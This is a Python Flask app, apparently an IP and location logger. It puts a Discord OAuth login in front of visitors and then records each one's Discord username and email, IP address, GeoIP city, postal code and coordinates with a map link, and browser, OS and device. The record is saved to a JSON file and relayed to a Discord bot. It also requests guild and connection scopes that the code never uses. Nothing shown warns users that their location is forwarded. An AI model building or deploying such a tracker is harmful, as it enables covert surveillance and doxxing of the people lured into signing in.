# main.py
import os
import json
import threading
import requests
from datetime import datetime
from flask import Flask, request, render_template
from user_agents import parse
from dotenv import load_dotenv
from discord_bot import bot, enqueue_task
import geoip2.database

load_dotenv()
app = Flask(__name__)
ACCESS_LOG_FILE = "access_log.json"

DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
GEOIP_DB_PATH = os.getenv("GEOIP_DB_PATH", "GeoLite2-City.mmdb")  # MaxMind GeoLite2 DB

# =========================
# IP から正確な位置情報を取得
# =========================
def get_geo_info(ip):
    try:
        reader = geoip2.database.Reader(GEOIP_DB_PATH)
        response = reader.city(ip)
        geo = {
            "ip": ip,
            "country": response.country.name or "不明",
            "region": response.subdivisions.most_specific.name or "不明",
            "city": response.city.name or "不明",
            "zip": response.postal.code or "不明",
            "lat": response.location.latitude,
            "lon": response.location.longitude,
            "proxy": False,  # MaxMind で判定する場合は追加可能
            "hosting": False  # MaxMind で判定する場合は追加可能
        }
        reader.close()
        return geo
    except:
        return {
            "ip": ip,
            "country": "不明",
            "region": "不明",
            "city": "不明",
            "zip": "不明",
            "lat": None,
            "lon": None,
            "proxy": False,
            "hosting": False
        }

def get_client_ip():
    if "X-Forwarded-For" in request.headers:
        return request.headers["X-Forwarded-For"].split(",")[0].strip()
    return request.remote_addr

# =========================
# アクセスログ保存
# =========================
def save_log(discord_id, data):
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if os.path.exists(ACCESS_LOG_FILE):
        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
            logs = json.load(f)
    else:
        logs = {}

    if discord_id not in logs:
        logs[discord_id] = {"history": []}

    data["timestamp"] = now
    logs[discord_id]["history"].append(data)

    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, indent=4, ensure_ascii=False)

# =========================
# Flask ルート
# =========================
@app.route("/")
def index():
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize?client_id={DISCORD_CLIENT_ID}"
        f"&redirect_uri={DISCORD_REDIRECT_URI}&response_type=code&scope=identify%20email%20guilds%20connections"
    )
    return render_template("index.html", discord_auth_url=discord_auth_url)


@app.route("/callback")
def callback():
    code = request.args.get("code")
    if not code:
        return "コードがありません", 400

    # Discord OAuth2 トークン取得
    data = {
        "client_id": DISCORD_CLIENT_ID,
        "client_secret": DISCORD_CLIENT_SECRET,
        "grant_type": "authorization_code",
        "code": code,
        "redirect_uri": DISCORD_REDIRECT_URI,
        "scope": "identify email guilds connections",
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    res = requests.post("https://discord.com/api/oauth2/token", data=data, headers=headers)
    token = res.json()
    access_token = token.get("access_token")
    if not access_token:
        return "アクセストークン取得失敗", 400

    headers_auth = {"Authorization": f"Bearer {access_token}"}
    user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()

    ip = get_client_ip()
    geo = get_geo_info(ip)
    ua = parse(request.headers.get("User-Agent", ""))

    log_data = {
        "username": f"{user.get('username')}#{user.get('discriminator')}",
        "email": user.get("email"),
        "ip": geo["ip"],
        "country": geo["country"],
        "region": geo["region"],
        "city": geo["city"],
        "zip": geo["zip"],
        "lat": geo["lat"],
        "lon": geo["lon"],
        "proxy": geo["proxy"],
        "browser": f"{ua.browser.family} {ua.browser.version_string}",
        "os": f"{ua.os.family} {ua.os.version_string}",
        "device": ua.device.family,
        "map_link": f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}" if geo['lat'] and geo['lon'] else None
    }

    save_log(user.get("id"), log_data)

    # Bot にタスク送信
    enqueue_task(embed_data={"title": "新規アクセス", "description": f"{log_data}"}, user_id=user.get("id"))

    return render_template("welcome.html", username=log_data["username"], log=log_data)

# =========================
# Bot スレッド起動
# =========================
def start_bot_thread():
    threading.Thread(target=lambda: bot.run(os.getenv("DISCORD_BOT_TOKEN")), daemon=True).start()

if __name__ == "__main__":
    start_bot_thread()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
